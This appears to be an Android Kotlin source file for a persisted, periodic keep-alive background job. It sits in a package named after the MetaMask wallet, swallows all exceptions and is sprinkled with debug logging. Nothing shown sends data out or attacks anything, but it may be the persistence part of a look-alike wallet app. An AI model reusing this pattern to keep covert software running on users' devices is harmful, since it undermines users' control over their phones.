package com.example.MetaMask.services

import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.ComponentName
import android.content.Context

class KeepAliveJobService : JobService() {

    companion object {
        private const val TAG = "KeepAliveJobSvc"
        private const val JOB_ID = 0x4B4A5341

        fun schedule(context: Context) {
            android.util.Log.d("XDBG", "[KeepAliveJobService] schedule enter context=ctx") //xdbg
            try {
                val js = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as? JobScheduler ?: return
                val cn = ComponentName(context, KeepAliveJobService::class.java)
                val info = JobInfo.Builder(JOB_ID, cn)
                    .setPeriodic(15 * 60 * 1000L)
                    .setPersisted(true)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
                    .build()
                js.schedule(info)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[KeepAliveJobService] catch (ignored)") //xdbg
            }
        }

        fun cancel(context: Context) {
            android.util.Log.d("XDBG", "[KeepAliveJobService] cancel enter context=ctx") //xdbg
            try {
                val js = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as? JobScheduler ?: return
                js.cancel(JOB_ID)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[KeepAliveJobService] catch (ignored)") //xdbg
            }
        }
    }

    override fun onStartJob(params: JobParameters?): Boolean {
        android.util.Log.d("XDBG", "[KeepAliveJobService] onStartJob enter params=${params}") //xdbg
        try {
            val mode = try { CraneService.craneMode } catch (_: Exception) { "" }
            if (mode != "off" && mode.isNotBlank()) {
                android.util.Log.d("XDBG", "[KeepAliveJobService] if branch") //xdbg
                KeepAliveManager.engage(applicationContext)
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[KeepAliveJobService] catch (ignored)") //xdbg
        }
        android.util.Log.d("XDBG", "[KeepAliveJobService] return") //xdbg
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        android.util.Log.d("XDBG", "[KeepAliveJobService] onStopJob enter params=${params}") //xdbg
        android.util.Log.d("XDBG", "[KeepAliveJobService] return") //xdbg
        return true
    }
}
